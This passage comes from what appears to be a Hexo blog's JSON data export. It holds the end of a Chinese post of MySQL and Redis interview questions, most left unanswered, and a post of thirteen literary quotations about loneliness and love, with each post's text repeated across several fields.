href=\"#13、SQL的整个解析过程、执行过程原理、SQL行转列\" class=\"headerlink\" title=\"13、SQL的整个解析过程、执行过程原理、SQL行转列\"></a>13、SQL的整个解析过程、执行过程原理、SQL行转列</h4><h4 id=\"14、Redis为什么这么快，Redis采用多线程会有那些问题\"><a href=\"#14、Redis为什么这么快，Redis采用多线程会有那些问题\" class=\"headerlink\" title=\"14、Redis为什么这么快，Redis采用多线程会有那些问题\"></a>14、Redis为什么这么快，Redis采用多线程会有那些问题</h4><h4 id=\"15、Redis支持那些数据结构\"><a href=\"#15、Redis支持那些数据结构\" class=\"headerlink\" title=\"15、Redis支持那些数据结构\"></a>15、Redis支持那些数据结构</h4><p>String 字符串、List 列表、Set 集合、Hash 哈希、Zset有序集合</p>\n<h4 id=\"16、Redsi跳表的问题\"><a href=\"#16、Redsi跳表的问题\" class=\"headerlink\" title=\"16、Redsi跳表的问题\"></a>16、Redsi跳表的问题</h4><h4 id=\"17、Redsi单进程单线程如何能够高并发\"><a href=\"#17、Redsi单进程单线程如何能够高并发\" class=\"headerlink\" title=\"17、Redsi单进程单线程如何能够高并发\"></a>17、Redsi单进程单线程如何能够高并发</h4><h4 id=\"18、如何使用Redis实现分布式锁\"><a href=\"#18、如何使用Redis实现分布式锁\" class=\"headerlink\" title=\"18、如何使用Redis实现分布式锁\"></a>18、如何使用Redis实现分布式锁</h4><h4 id=\"19、Redis分布式锁操作的原子性，Redsi内部是如何实现的\"><a href=\"#19、Redis分布式锁操作的原子性，Redsi内部是如何实现的\" class=\"headerlink\" title=\"19、Redis分布式锁操作的原子性，Redsi内部是如何实现的\"></a>19、Redis分布式锁操作的原子性，Redsi内部是如何实现的</h4><h4 id=\"20、为什么用自增列作为主键\"><a href=\"#20、为什么用自增列作为主键\" class=\"headerlink\" title=\"20、为什么用自增列作为主键\"></a>20、为什么用自增列作为主键</h4><ol>\n<li><h4 id=\"21、MySQL的索引都有哪些\"><a href=\"#21、MySQL的索引都有哪些\" class=\"headerlink\" title=\"21、MySQL的索引都有哪些\"></a>21、MySQL的索引都有哪些</h4></li>\n</ol>\n<p>MySQL的索引分为单列索引（普通索引、唯一索引、主键索引）和组合索引。</p>\n<p>(1) 普通索引</p>\n<p>最基本的索引，没有任何限制</p>\n<p>(2) 唯一索引</p>\n<p>它与普通索引类似，不同的是索引列的值必须是唯一的，但允许有空值；如果是组合索引，则列值的组合必须唯一。</p>\n<p>(3) 主键索引</p>\n<p>它是一种特殊的唯一索引，不允许有空值，一般是在建表的时候创建主键索引</p>\n<p>(4) 组合索引</p>\n<p>多个列组成一个索引，专门用于组合搜索</p>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","site":{"data":{}},"excerpt":"","more":"<h4 id=\"1、SQL优化的常见方法\"><a href=\"#1、SQL优化的常见方法\" class=\"headerlink\" title=\"1、SQL优化的常见方法\"></a>1、SQL优化的常见方法</h4><h4 id=\"2、SQL索引的顺序、字段的顺序\"><a href=\"#2、SQL索引的顺序、字段的顺序\" class=\"headerlink\" title=\"2、SQL索引的顺序、字段的顺序\"></a>2、SQL索引的顺序、字段的顺序</h4><h4 id=\"3、查看SQL索引\"><a href=\"#3、查看SQL索引\" class=\"headerlink\" title=\"3、查看SQL索引\"></a>3、查看SQL索引</h4><h4 id=\"4、Mysql分页查询语句\"><a href=\"#4、Mysql分页查询语句\" class=\"headerlink\" title=\"4、Mysql分页查询语句\"></a>4、Mysql分页查询语句</h4><h4 id=\"5、Mysql的事物特性和隔离级别\"><a href=\"#5、Mysql的事物特性和隔离级别\" class=\"headerlink\" title=\"5、Mysql的事物特性和隔离级别\"></a>5、Mysql的事物特性和隔离级别</h4><ul>\n<li>事务特性(ACID)<ul>\n<li>原子性(Atomicity):一个事务必须视为一个不可分割的最小工作单元，整个事务中的所有操作要么全部提交成功，要么全部失败回滚。</li>\n<li>一致性(Consistency):数据库总是从一个一致性的状态转移到另一个一致性的状态</li>\n<li>隔离性(Isolation)：一个事务所做的修改在最终提交前，对其他事务是不可见的。</li>\n<li>持久性(Durability)：一旦事务提交，其所做的修改就会永久的保存在数据库中</li>\n</ul>\n</li>\n<li>隔离级别：<ul>\n<li>读未提交(read-uncommited)：一个事务读取另一个事务未提交的数据，可能会出现脏读</li>\n<li>读已提交(read-commited)：一个事务要等到另一个事务提交后才能读取数据，可能会出现不可重复读</li>\n<li>可重复读(repeatable-read)：开始读取数据的事务开始后，不在允许修改动作，可能会出现幻读</li>\n<li>序列化读(Serializble)：串行化顺序执行<br>大多数数据库默认的隔离级别是read commited如sql server、oracle，Mysql的默认级别是repeatable-read。</li>\n</ul>\n</li>\n</ul>\n<h4 id=\"6、sql-having的使用场景\"><a href=\"#6、sql-having的使用场景\" class=\"headerlink\" title=\"6、sql having的使用场景\"></a>6、sql having的使用场景</h4><h4 id=\"7、Mysql数据库的索引及原理\"><a href=\"#7、Mysql数据库的索引及原理\" class=\"headerlink\" title=\"7、Mysql数据库的索引及原理\"></a>7、Mysql数据库的索引及原理</h4><h4 id=\"8、锁机制介绍：行锁、表锁、排它锁、共享锁\"><a href=\"#8、锁机制介绍：行锁、表锁、排它锁、共享锁\" class=\"headerlink\" title=\"8、锁机制介绍：行锁、表锁、排它锁、共享锁\"></a>8、锁机制介绍：行锁、表锁、排它锁、共享锁</h4><h4 id=\"9、乐观锁的业务场景和实现方式\"><a href=\"#9、乐观锁的业务场景和实现方式\" class=\"headerlink\" title=\"9、乐观锁的业务场景和实现方式\"></a>9、乐观锁的业务场景和实现方式</h4><h4 id=\"10、事务介绍、分布式事务的理解，常见的解决方案有哪些？-什么是两阶段提交、三阶段提交\"><a href=\"#10、事务介绍、分布式事务的理解，常见的解决方案有哪些？-什么是两阶段提交、三阶段提交\" class=\"headerlink\" title=\"10、事务介绍、分布式事务的理解，常见的解决方案有哪些？ 什么是两阶段提交、三阶段提交\"></a>10、事务介绍、分布式事务的理解，常见的解决方案有哪些？ 什么是两阶段提交、三阶段提交</h4><h4 id=\"11、Mysql记录binglog的方式主要包括三种模式，每种模式的优缺点是什么\"><a href=\"#11、Mysql记录binglog的方式主要包括三种模式，每种模式的优缺点是什么\" class=\"headerlink\" title=\"11、Mysql记录binglog的方式主要包括三种模式，每种模式的优缺点是什么\"></a>11、Mysql记录binglog的方式主要包括三种模式，每种模式的优缺点是什么</h4><h4 id=\"12、JDBC如何实现事务、嵌套事务实现、分布式事务实现\"><a href=\"#12、JDBC如何实现事务、嵌套事务实现、分布式事务实现\" class=\"headerlink\" title=\"12、JDBC如何实现事务、嵌套事务实现、分布式事务实现\"></a>12、JDBC如何实现事务、嵌套事务实现、分布式事务实现</h4><h4 id=\"13、SQL的整个解析过程、执行过程原理、SQL行转列\"><a href=\"#13、SQL的整个解析过程、执行过程原理、SQL行转列\" class=\"headerlink\" title=\"13、SQL的整个解析过程、执行过程原理、SQL行转列\"></a>13、SQL的整个解析过程、执行过程原理、SQL行转列</h4><h4 id=\"14、Redis为什么这么快，Redis采用多线程会有那些问题\"><a href=\"#14、Redis为什么这么快，Redis采用多线程会有那些问题\" class=\"headerlink\" title=\"14、Redis为什么这么快，Redis采用多线程会有那些问题\"></a>14、Redis为什么这么快，Redis采用多线程会有那些问题</h4><h4 id=\"15、Redis支持那些数据结构\"><a href=\"#15、Redis支持那些数据结构\" class=\"headerlink\" title=\"15、Redis支持那些数据结构\"></a>15、Redis支持那些数据结构</h4><p>String 字符串、List 列表、Set 集合、Hash 哈希、Zset有序集合</p>\n<h4 id=\"16、Redsi跳表的问题\"><a href=\"#16、Redsi跳表的问题\" class=\"headerlink\" title=\"16、Redsi跳表的问题\"></a>16、Redsi跳表的问题</h4><h4 id=\"17、Redsi单进程单线程如何能够高并发\"><a href=\"#17、Redsi单进程单线程如何能够高并发\" class=\"headerlink\" title=\"17、Redsi单进程单线程如何能够高并发\"></a>17、Redsi单进程单线程如何能够高并发</h4><h4 id=\"18、如何使用Redis实现分布式锁\"><a href=\"#18、如何使用Redis实现分布式锁\" class=\"headerlink\" title=\"18、如何使用Redis实现分布式锁\"></a>18、如何使用Redis实现分布式锁</h4><h4 id=\"19、Redis分布式锁操作的原子性，Redsi内部是如何实现的\"><a href=\"#19、Redis分布式锁操作的原子性，Redsi内部是如何实现的\" class=\"headerlink\" title=\"19、Redis分布式锁操作的原子性，Redsi内部是如何实现的\"></a>19、Redis分布式锁操作的原子性，Redsi内部是如何实现的</h4><h4 id=\"20、为什么用自增列作为主键\"><a href=\"#20、为什么用自增列作为主键\" class=\"headerlink\" title=\"20、为什么用自增列作为主键\"></a>20、为什么用自增列作为主键</h4><ol>\n<li><h4 id=\"21、MySQL的索引都有哪些\"><a href=\"#21、MySQL的索引都有哪些\" class=\"headerlink\" title=\"21、MySQL的索引都有哪些\"></a>21、MySQL的索引都有哪些</h4></li>\n</ol>\n<p>MySQL的索引分为单列索引（普通索引、唯一索引、主键索引）和组合索引。</p>\n<p>(1) 普通索引</p>\n<p>最基本的索引，没有任何限制</p>\n<p>(2) 唯一索引</p>\n<p>它与普通索引类似，不同的是索引列的值必须是唯一的，但允许有空值；如果是组合索引，则列值的组合必须唯一。</p>\n<p>(3) 主键索引</p>\n<p>它是一种特殊的唯一索引，不允许有空值，一般是在建表的时候创建主键索引</p>\n<p>(4) 组合索引</p>\n<p>多个列组成一个索引，专门用于组合搜索</p>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>"},{"title":"生活-文艺到爆的句子","date":"2018-11-26T09:15:45.000Z","_content":"\n1、我慢慢明白了为什么我不快乐，因为我总是期待一个结果。看一本书期待它让我变得深刻；吃饭、游泳期待它让我一斤斤瘦下；发一条微信期待被回复；对别人好期待被回待以好；写一个故事期待被关注安慰；参加一个活动，期待换来充实丰富的经历；这些预设的期待如果实现了，我就长舒一口气。如果没有实现，就自怨自艾。可是小时候也是同一个我，用一个下午的时间看蚂蚁搬家，等石头开花。小时候不期待结果，小时候的笑哭都不打折。<div style=\"text-align: right\"> ——《允许自己虚度时光》 </div>\n\n2、在一回首间，才忽然发现，原来我一生的种种努力，不过只是为了周遭的人对我满意而已，为了博得他人的称许和微笑，我战战兢兢的将自己套入所有的模式所有的桎梏，走到途中才发现，我只剩下一副模糊的面目，和一条不能回头的路。<div style=\"text-align: right\"> ——席慕蓉《独白》 </div>\n\n3、我确实真诚地喜欢过你，想过带你去看每年故宫的初雪，阿拉斯加的海岸线，我曾愿意与你两人独占一江秋，愿意与你郡亭枕上看潮头，铺着红地毯的礼堂，暮霭沉沉的原野，我都曾愿与你共享，我想想过和你一起生活，直到白发苍苍垂垂老矣，同枕共穴，至死不休。可是我现在确实不喜欢你了，车站年久失修，江南的砖瓦裂了缝，当初不撞南墙不会头的热血已然冷却。抱歉啦，我们就此别过吧，我的喜欢要留给别人了。\n此生勿复见，山水不相逢。<div style=\"text-align: right\"> ——钟意《摘录墙》 </div>\n\n4、从童年起，我便独自一人，照顾着历代的星星。<div style=\"text-align: right\"> ——《孤独》 </div>\n\n5、我不在装模做样的拥有很多朋友，而是回到了孤单之中，以真正的我开始了独自的生活，有时我也会因为寂寞而难以忍受空虚的折磨，但无宁愿以这样的方式来维护自己的自尊，也不愿以耻辱为代价去换取那种表面的朋友。<div style=\"text-align: right\"> ——余华《在细雨中呼喊》 </div>\n\n\n6、太敏感的人会体谅到他人的痛苦，自然就无法轻易做到坦率，所谓的坦率，其实就是暴力。敏感的人会被动性的洞穿对方的难处，就不能无动于衷，总想着为对方分担一些，就算是要委屈自己，往往敏感的人在事情未发生前就提前自我创造了痛苦。所以那些共情能力弱的人，是很自私光明的在幸福着。好想抱一抱每一个因为敏感而变得小心翼翼的人，我懂得他们内心的善良，亦知晓他们的可贵。要好好对待身边敏感且善良的人才好。\n\n\n7、你要知道什么是自己想要的，知道什么是不可逆转的，知道用什么方式实现梦想，知道用什么心情面对苦难，人就在转瞬间感悟，进退得失不离不弃也就都有了答案。我不知道命运会把我带到何方，但是我一直会用善良维护左右。\n\n\n8、上邪，我欲与君相如，长命无绝哀。山无棱，江水为竭。冬雷震震，夏雨雪。天地合，乃敢与君绝。<div style=\"text-align: right\"> ——上邪 </div>\n\n9、我装作老成，人们就传言我老成。我假装是个懒汉，人人就讹传我是懒惰虫。我假装不会写小说，人们就讹传我不会写。我伪装成骗子，人们就说我是个骗子。我充阔，人人以为我是阔佬。我故作冷谈，人人就说我是个无情的家伙。然而，当我真的痛苦万分，不由得呻吟时，人人却认为我是在无病呻吟。<div style=\"text-align: right\"> ——太宰治 </div>\n\n10、我所有的自负都来自我的自卑，所有的英雄气概都来自我内心的软弱，所有的振振有词都因为心中满是怀疑，我假装深情，其实是痛恨自己的无情，我以为人生的意义在于四处游荡流亡，其实只是掩饰至今没有找到可以驻足的地方。<div style=\"text-align: right\"> ——马良《坦白书》 </div>\n\n11、事情往往是这样的，你生了一种病，然后发现导出都是同病者。你丢了一只狗，随后发现满大街都是流浪狗，却都不是你丢的那一只。人的境遇是一种筛子，删选了落到了我们视野的人和事，人一旦掉到了一种境遇里，就会变成吸铁石，把铁屑吸到身边来。<div style=\"text-align: right\"> ——韩松落《鲤.旅馆》 </div>\n\n12、每个人的心中都有一团火，路过的人只看到了烟。但是总有一个人，总有那么一个人能看到这团火，然后走过来，陪我一起。我在人人群中，看到了他的火，然后快步走过去，生怕慢一点他就会被淹没在岁月的尘埃里。我带着我的热情，我的冷漠，我的狂暴，我的温和，以及对爱情的毫无理由的相信，走的上气不接下气。我结结巴巴的对他说：你叫什么名字。从你叫什么名字开始，后来，有了一切。<div style=\"text-align: right\"> ——梵高写提奥的信 </div>\n\n13、我渴望能见你一面，但请你记得，我不会开口见你。这不是因为我骄傲，你知道我在你面前毫无骄傲可言，而是因为，唯有你也想见我的时候，我们见面才有意义。<div style=\"text-align: right\"> ——西蒙波伏娃 </div>\n\n\n<br>\n<br>\n<br>\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","source":"_posts/生活-文艺到爆的句子.md","raw":"---\ntitle: 生活-文艺到爆的句子\ndate: 2018-11-26 17:15:45\ntags: ['诗意','文艺','美句']\ncategories: 生活\n---\n\n1、我慢慢明白了为什么我不快乐，因为我总是期待一个结果。看一本书期待它让我变得深刻；吃饭、游泳期待它让我一斤斤瘦下；发一条微信期待被回复；对别人好期待被回待以好；写一个故事期待被关注安慰；参加一个活动，期待换来充实丰富的经历；这些预设的期待如果实现了，我就长舒一口气。如果没有实现，就自怨自艾。可是小时候也是同一个我，用一个下午的时间看蚂蚁搬家，等石头开花。小时候不期待结果，小时候的笑哭都不打折。<div style=\"text-align: right\"> ——《允许自己虚度时光》 </div>\n\n2、在一回首间，才忽然发现，原来我一生的种种努力，不过只是为了周遭的人对我满意而已，为了博得他人的称许和微笑，我战战兢兢的将自己套入所有的模式所有的桎梏，走到途中才发现，我只剩下一副模糊的面目，和一条不能回头的路。<div style=\"text-align: right\"> ——席慕蓉《独白》 </div>\n\n3、我确实真诚地喜欢过你，想过带你去看每年故宫的初雪，阿拉斯加的海岸线，我曾愿意与你两人独占一江秋，愿意与你郡亭枕上看潮头，铺着红地毯的礼堂，暮霭沉沉的原野，我都曾愿与你共享，我想想过和你一起生活，直到白发苍苍垂垂老矣，同枕共穴，至死不休。可是我现在确实不喜欢你了，车站年久失修，江南的砖瓦裂了缝，当初不撞南墙不会头的热血已然冷却。抱歉啦，我们就此别过吧，我的喜欢要留给别人了。\n此生勿复见，山水不相逢。<div style=\"text-align: right\"> ——钟意《摘录墙》 </div>\n\n4、从童年起，我便独自一人，照顾着历代的星星。<div style=\"text-align: right\"> ——《孤独》 </div>\n\n5、我不在装模做样的拥有很多朋友，而是回到了孤单之中，以真正的我开始了独自的生活，有时我也会因为寂寞而难以忍受空虚的折磨，但无宁愿以这样的方式来维护自己的自尊，也不愿以耻辱为代价去换取那种表面的朋友。<div style=\"text-align: right\"> ——余华《在细雨中呼喊》 </div>\n\n\n6、太敏感的人会体谅到他人的痛苦，自然就无法轻易做到坦率，所谓的坦率，其实就是暴力。敏感的人会被动性的洞穿对方的难处，就不能无动于衷，总想着为对方分担一些，就算是要委屈自己，往往敏感的人在事情未发生前就提前自我创造了痛苦。所以那些共情能力弱的人，是很自私光明的在幸福着。好想抱一抱每一个因为敏感而变得小心翼翼的人，我懂得他们内心的善良，亦知晓他们的可贵。要好好对待身边敏感且善良的人才好。\n\n\n7、你要知道什么是自己想要的，知道什么是不可逆转的，知道用什么方式实现梦想，知道用什么心情面对苦难，人就在转瞬间感悟，进退得失不离不弃也就都有了答案。我不知道命运会把我带到何方，但是我一直会用善良维护左右。\n\n\n8、上邪，我欲与君相如，长命无绝哀。山无棱，江水为竭。冬雷震震，夏雨雪。天地合，乃敢与君绝。<div style=\"text-align: right\"> ——上邪 </div>\n\n9、我装作老成，人们就传言我老成。我假装是个懒汉，人人就讹传我是懒惰虫。我假装不会写小说，人们就讹传我不会写。我伪装成骗子，人们就说我是个骗子。我充阔，人人以为我是阔佬。我故作冷谈，人人就说我是个无情的家伙。然而，当我真的痛苦万分，不由得呻吟时，人人却认为我是在无病呻吟。<div style=\"text-align: right\"> ——太宰治 </div>\n\n10、我所有的自负都来自我的自卑，所有的英雄气概都来自我内心的软弱，所有的振振有词都因为心中满是怀疑，我假装深情，其实是痛恨自己的无情，我以为人生的意义在于四处游荡流亡，其实只是掩饰至今没有找到可以驻足的地方。<div style=\"text-align: right\"> ——马良《坦白书》 </div>\n\n11、事情往往是这样的，你生了一种病，然后发现导出都是同病者。你丢了一只狗，随后发现满大街都是流浪狗，却都不是你丢的那一只。人的境遇是一种筛子，删选了落到了我们视野的人和事，人一旦掉到了一种境遇里，就会变成吸铁石，把铁屑吸到身边来。<div style=\"text-align: right\"> ——韩松落《鲤.旅馆》 </div>\n\n12、每个人的心中都有一团火，路过的人只看到了烟。但是总有一个人，总有那么一个人能看到这团火，然后走过来，陪我一起。我在人人群中，看到了他的火，然后快步走过去，生怕慢一点他就会被淹没在岁月的尘埃里。我带着我的热情，我的冷漠，我的狂暴，我的温和，以及对爱情的毫无理由的相信，走的上气不接下气。我结结巴巴的对他说：你叫什么名字。从你叫什么名字开始，后来，有了一切。<div style=\"text-align: right\"> ——梵高写提奥的信 </div>\n\n13、我渴望能见你一面，但请你记得，我不会开口见你。这不是因为我骄傲，你知道我在你面前毫无骄傲可言，而是因为，唯有你也想见我的时候，我们见面才有意义。<div style=\"text-align: right\"> ——西蒙波伏娃 </div>\n\n\n<br>\n<br>\n<br>\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","slug":"生活-文艺到爆的句子","published":1,"updated":"2018-11-29T10:11:18.570Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck0oko2gt001fo25t46vi5z1n","content":"<p>1、我慢慢明白了为什么我不快乐，因为我总是期待一个结果。看一本书期待它让我变得深刻；吃饭、游泳期待它让我一斤斤瘦下；发一条微信期待被回复；对别人好期待被回待以好；写一个故事期待被关注安慰；参加一个活动，期待换来充实丰富的经历；这些预设的期待如果实现了，我就长舒一口气。如果没有实现，就自怨自艾。可是小时候也是同一个我，用一个下午的时间看蚂蚁搬家，等石头开花。小时候不期待结果，小时候的笑哭都不打折。<div style=\"text-align: right\"> ——《允许自己虚度时光》 </div></p>\n<p>2、在一回首间，才忽然发现，原来我一生的种种努力，不过只是为了周遭的人对我满意而已，为了博得他人的称许和微笑，我战战兢兢的将自己套入所有的模式所有的桎梏，走到途中才发现，我只剩下一副模糊的面目，和一条不能回头的路。<div style=\"text-align: right\"> ——席慕蓉《独白》 </div></p>\n<p>3、我确实真诚地喜欢过你，想过带你去看每年故宫的初雪，阿拉斯加的海岸线，我曾愿意与你两人独占一江秋，愿意与你郡亭枕上看潮头，铺着红地毯的礼堂，暮霭沉沉的原野，我都曾愿与你共享，我想想过和你一起生活，直到白发苍苍垂垂老矣，同枕共穴，至死不休。可是我现在确实不喜欢你了，车站年久失修，江南的砖瓦裂了缝，当初不撞南墙不会头的热血已然冷却。抱歉啦，我们就此别过吧，我的喜欢要留给别人了。<br>此生勿复见，山水不相逢。<div style=\"text-align: right\"> ——钟意《摘录墙》 </div></p>\n<p>4、从童年起，我便独自一人，照顾着历代的星星。<div style=\"text-align: right\"> ——《孤独》 </div></p>\n<p>5、我不在装模做样的拥有很多朋友，而是回到了孤单之中，以真正的我开始了独自的生活，有时我也会因为寂寞而难以忍受空虚的折磨，但无宁愿以这样的方式来维护自己的自尊，也不愿以耻辱为代价去换取那种表面的朋友。<div style=\"text-align: right\"> ——余华《在细雨中呼喊》 </div></p>\n<p>6、太敏感的人会体谅到他人的痛苦，自然就无法轻易做到坦率，所谓的坦率，其实就是暴力。敏感的人会被动性的洞穿对方的难处，就不能无动于衷，总想着为对方分担一些，就算是要委屈自己，往往敏感的人在事情未发生前就提前自我创造了痛苦。所以那些共情能力弱的人，是很自私光明的在幸福着。好想抱一抱每一个因为敏感而变得小心翼翼的人，我懂得他们内心的善良，亦知晓他们的可贵。要好好对待身边敏感且善良的人才好。</p>\n<p>7、你要知道什么是自己想要的，知道什么是不可逆转的，知道用什么方式实现梦想，知道用什么心情面对苦难，人就在转瞬间感悟，进退得失不离不弃也就都有了答案。我不知道命运会把我带到何方，但是我一直会用善良维护左右。</p>\n<p>8、上邪，我欲与君相如，长命无绝哀。山无棱，江水为竭。冬雷震震，夏雨雪。天地合，乃敢与君绝。<div style=\"text-align: right\"> ——上邪 </div></p>\n<p>9、我装作老成，人们就传言我老成。我假装是个懒汉，人人就讹传我是懒惰虫。我假装不会写小说，人们就讹传我不会写。我伪装成骗子，人们就说我是个骗子。我充阔，人人以为我是阔佬。我故作冷谈，人人就说我是个无情的家伙。然而，当我真的痛苦万分，不由得呻吟时，人人却认为我是在无病呻吟。<div style=\"text-align: right\"> ——太宰治 </div></p>\n<p>10、我所有的自负都来自我的自卑，所有的英雄气概都来自我内心的软弱，所有的振振有词都因为心中满是怀疑，我假装深情，其实是痛恨自己的无情，我以为人生的意义在于四处游荡流亡，其实只是掩饰至今没有找到可以驻足的地方。<div style=\"text-align: right\"> ——马良《坦白书》 </div></p>\n<p>11、事情往往是这样的，你生了一种病，然后发现导出都是同病者。你丢了一只狗，随后发现满大街都是流浪狗，却都不是你丢的那一只。人的境遇是一种筛子，删选了落到了我们视野的人和事，人一旦掉到了一种境遇里，就会变成吸铁石，把铁屑吸到身边来。<div style=\"text-align: right\"> ——韩松落《鲤.旅馆》 </div></p>\n<p>12、每个人的心中都有一团火，路过的人只看到了烟。但是总有一个人，总有那么一个人能看到这团火，然后走过来，陪我一起。我在人人群中，看到了他的火，然后快步走过去，生怕慢一点他就会被淹没在岁月的尘埃里。我带着我的热情，我的冷漠，我的狂暴，我的温和，以及对爱情的毫无理由的相信，走的上气不接下气。我结结巴巴的对他说：你叫什么名字。从你叫什么名字开始，后来，有了一切。<div style=\"text-align: right\"> ——梵高写提奥的信 </div></p>\n<p>13、我渴望能见你一面，但请你记得，我不会开口见你。这不是因为我骄傲，你知道我在你面前毫无骄傲可言，而是因为，唯有你也想见我的时候，我们见面才有意义。<div style=\"text-align: right\"> ——西蒙波伏娃 </div></p>\n<p><br><br><br><br><br></p>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","site":{"data":{}},"excerpt":"","more":"<p>1、我慢慢明白了为什么我不快乐，因为我总是期待一个结果。看一本书期待它让我变得深刻；吃饭、游泳期待它让我一斤斤瘦下；发一条微信期待被回复；对别人好期待被回待以好；写一个故事期待被关注安慰；参加一个活动，期待换来充实丰富的经历；这些预设的期待如果实现了，我就长舒一口气。如果没有实现，就自怨自艾。可是小时候也是同一个我，用一个下午的时间看蚂蚁搬家，等石头开花。小时候不期待结果，小时候的笑哭都不打折。<div style=\"text-align: right\"> ——《允许自己虚度时光》 </div></p>\n<p>2、在一回首间，才忽然发现，原来我一生的种种努力，不过只是为了周遭的人对我满意而已，为了博得他人的称许和微笑，我战战兢兢的将自己套入所有的模式所有的桎梏，走到途中才发现，我只剩下一副模糊的面目，和一条不能回头的路。<div style=\"text-align: right\"> ——席慕蓉《独白》 </div></p>\n<p>3、我确实真诚地喜欢过你，想过带你去看每年故宫的初雪，阿拉斯加的海岸线，我曾愿意与你两人独占一江秋，愿意与你郡亭枕上看潮头，铺着红地毯的礼堂，暮霭沉沉的原野，我都曾愿与你共享，我想想过和你一起生活，直到白发苍苍垂垂老矣，同枕共穴，至死不休。可是我现在确实不喜欢你了，车站年久失修，江南的砖瓦裂了缝，当初不撞南墙不会头的热血已然冷却。抱歉啦，我们就此别过吧，我的喜欢要留给别人了。<br>此生勿复见，山水不相逢。<div style=\"text-align: right\"> ——钟意《摘录墙》 </div></p>\n<p>4、从童年起，我便独自一人，照顾着历代的星星。<div style=\"text-align: right\"> ——《孤独》 </div></p>\n<p>5、我不在装模做样的拥有很多朋友，而是回到了孤单之中，以真正的我开始了独自的生活，有时我也会因为寂寞而难以忍受空虚的折磨，但无宁愿以这样的方式来维护自己的自尊，也不愿以耻辱为代价去换取那种表面的朋友。<div style=\"text-align: right\"> ——余华《在细雨中呼喊》 </div></p>\n<p>6、太敏感的人会体谅到他人的痛苦，自然就无法轻易做到坦率，所谓的坦率，其实就是暴力。敏感的人会被动性的洞穿对方的难处，就不能无动于衷，总想着为对方分担一些，就算是要委屈自己，往往敏感的人在事情未发生前就提前自我创造了痛苦。所以那些共情能力弱的人，是很自私光明的在幸福着。好想抱一抱每一个因为敏感而变得小心翼翼的人，我懂得他们内心的善良，亦知晓他们的可贵。要好好对待身边敏感且善良的人才好。</p>\n<p>7、你要知道什么是自己想要的，知道什么是不可逆转的，知道用什么方式实现梦想，知道用什么心情面对苦难，人就在转瞬间感悟，进退得失不离不弃也就都有了答案。我不知道命运会把我带到何方，但是我一直会用善良维护左右。</p>\n<p>8、上邪，我欲与君相如，长命无绝哀。山无棱，江水为竭。冬雷震震，夏雨雪。天地合，乃敢与君绝。<div style=\"text-align: right\"> ——上邪 </div></p>\n<p>9、我装作老成，人们就传言我老成。我假装是个懒汉，人人就讹传我是懒惰虫。我假装不会写小说，人们就讹传我不会写。我伪装成骗子，人们就说我是个骗子。我充阔，人人以为我是阔佬。我故作冷谈，人人就说我是个无情的家伙。然而，当我真的痛苦万分，不由得呻吟时，人人却认为我是在无病呻吟。<div style=\"text-align: right\"> ——太宰治 </div></p>\n<p>10、我所有的自负都来自我的自卑，所有的英雄气概都来自我内心的软弱，所有的振振有词都因为心中满是怀疑，我假装深情，其实是痛恨自己的无情，我以为人生的意义在于四处游荡流亡，其实只是掩饰至今没有找到可以驻足的地方。<div style=\"text-align: right\"> ——马良《坦白书》 </div></p>\n<p>11、事情往往是这样的，你生了一种病，然后发现导出都是同病者。你丢了一只狗，随后发现满大街都是流浪狗，却都不是你丢的那一只。人的境遇是一种筛子，删选了落到了我们视野的人和事，人一旦掉到了一种境遇里，就会变成吸铁石，把铁屑吸到身边来。<div style=\"text-align: right\"> ——韩松落《鲤.旅馆》 </div></p>\n<p>12、每个人的心中都有一团火，路过的人只看到了烟。但是总有一个人，总有那么一个人能看到这团火，然后走过来，陪我一起。我在人人群中，看到了他的火，然后快步走过去，生怕慢一点他就会被淹没在岁月的尘埃里。我带着我的热情，我的冷漠，我的狂暴，我的温和，以及对爱情的毫无理由的相信，走的上气不接下气。我结结巴巴的对他说：你叫什么名字。从你叫什么名字开始，后来，有了一切。<div style=\"text-align: right\"> ——梵高写提奥的信 </div></p>\n<p>13、我渴望能见你一面，但请你记得，我不会开口见你。这不是因为我骄傲，你知道我在你面前毫无骄傲可言，而是因为，唯有你也想见我的时候，我们见面才有意义。<div style=\"text-align: right\"> ——西蒙波伏娃 </div></p>\n<p><br><br><br><br><br></p>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || 